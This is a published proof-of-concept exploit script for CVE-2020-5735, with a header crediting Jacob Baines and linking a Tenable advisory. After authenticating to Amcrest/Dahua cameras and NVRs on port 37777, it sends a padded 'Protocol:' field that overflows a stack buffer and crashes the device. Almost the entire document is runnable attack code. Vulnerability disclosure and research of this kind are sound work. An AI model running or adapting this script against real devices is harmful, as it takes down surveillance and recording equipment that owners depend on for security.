# Exploit Title: Amcrest Dahua NVR Camera IP2M-841 - Denial of Service (PoC)
# Date: 2020-04-07
# Exploit Author: Jacob Baines
# Vendor Homepage: https://amcrest.com/
# Software Link: https://amcrest.com/firmwaredownloads
# Version: Many different versions due to number of Dahua/Amcrest/etc
# devices affected
# Tested on: Amcrest IP2M-841 2.420.AC00.18.R and AMDVTENL8-H5
# 4.000.00AC000.0
# CVE : CVE-2020-5735
# Advisory: https://www.tenable.com/security/research/tra-2020-20
# Amcrest & Dahua NVR/Camera Port 37777 Authenticated Crash

import argparse
import hashlib
import socket
import struct
import sys
import md5
import re

## DDNS test functionality. Stack overflow via memcpy

def recv_response(sock):
    # minimum size is 32 bytes
    header = sock.recv(32)

    # check we received enough data
    if len(header) != 32:
        print 'Invalid response. Too short'
        return (False, '', '')

    # extract the payload length field
    length_field = header[4:8]
    payload_length = struct.unpack_from('I', length_field)
    payload_length = payload_length[0]

    # uhm... lets be restrictive of accepted lengths
    if payload_length < 0 or payload_length > 4096:
        print 'Invalid response. Bad payload length'
        return (False, header, '')

    if (payload_length == 0):
        return (True, header, '')

    payload = sock.recv(payload_length)
    if len(payload) != payload_length:
        print 'Invalid response. Bad received length'
        return (False, header, payload)

    return (True, header, payload)

def sofia_hash(msg):
    h = ""
    m = hashlib.md5()
    m.update(msg)
    msg_md5 = m.digest()
    for i in range(8):
        n = (ord(msg_md5[2*i]) + ord(msg_md5[2*i+1])) % 0x3e
        if n > 9:
            if n > 35:
                n += 61
            else:
                n += 55
        else:
            n += 0x30
        h += chr(n)
    return h

top_parser = argparse.ArgumentParser(description='lol')
top_parser.add_argument('-i', '--ip', action="store", dest="ip",
required=True, help="The IPv4 address to connect to")
top_parser.add_argument('-p', '--port', action="store", dest="port",
type=int, help="The port to connect to", default="37777")
top_parser.add_argument('-u', '--username', action="store",
dest="username", help="The user to login as", default="admin")
top_parser.add_argument('--pass', action="store", dest="password",
required=True, help="The password to use")
args = top_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Attempting connection to " + args.ip + ":" + str(args.port)
sock.connect((args.ip, args.port))
print "[+] Connected!"

# send the old style login request. We'll use blank hashes. This should
# trigger a challenge from new versions of the camera
old_login = ("\xa0\x05\x00\x60\x00\x00\x00\x00" +
             "\x00\x00\x00\x00\x00\x00\x00\x00" + # username hash
             "\x00\x00\x00\x00\x00\x00\x00\x00" + # password hash
             "\x05\x02\x00\x01\x00\x00\xa1\xaa")
sock.sendall(old_login)
(success, header, challenge) = recv_response(sock)
if success == False or not challenge:
    print 'Failed to receive the challenge'
    print challenge
    sys.exit(0)

# extract the realm and random seed
seeds = re.search("Realm:(Login to [A-Za-z0-9]+)\r\nRandom:([0-9]+)\r\n",
challenge)
if seeds == None:
    print 'Failed to extract realm and random seed.'
    print challenge
    sys.exit(0)

realm = seeds.group(1)
random = seeds.group(2)

# compute the response
realm_hash = md5.new(args.username + ":" + realm + ":" +
args.password).hexdigest().upper()
random_hash = md5.new(args.username + ":" + random + ":" +
realm_hash).hexdigest().upper()
sofia_result = sofia_hash(args.password)
final_hash = md5.new(args.username + ":" + random + ":" +
sofia_result).hexdigest().upper()

challenge_resp = ("\xa0\x05\x00\x60\x47\x00\x00\x00" +
                  "\x00\x00\x00\x00\x00\x00\x00\x00" +
                  "\x00\x00\x00\x00\x00\x00\x00\x00" +
                  "\x05\x02\x00\x08\x00\x00\xa1\xaa" +
                  args.username + "&&" + random_hash + final_hash)
sock.sendall(challenge_resp)

(success, header, payload) = recv_response(sock)
if success == False or not header:
    print 'Failed to receive the session id'
    sys.exit(0)

session_id_bin = header[16:20]
session_id_int = struct.unpack_from('I', session_id_bin)
if session_id_int[0] == 0:
    print "Log in failed."
    sys.exit(0)

session_id = session_id_int[0]
print "[+] Session ID: " + str(session_id)

# firmware version
command = "Protocol: " + ("a" * 0x300) + "\r\n"
command_length = struct.pack("I", len(command))
firmware = ("\x62\x00\x00\x00" + command_length +
            "\x04\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00" +
            command)
sock.sendall(firmware)
(success, header, firmware_string) = recv_response(sock)
if success == False and not header:
    print "[!] Probably crashed the server."
else:
    print "[+] Attack failed."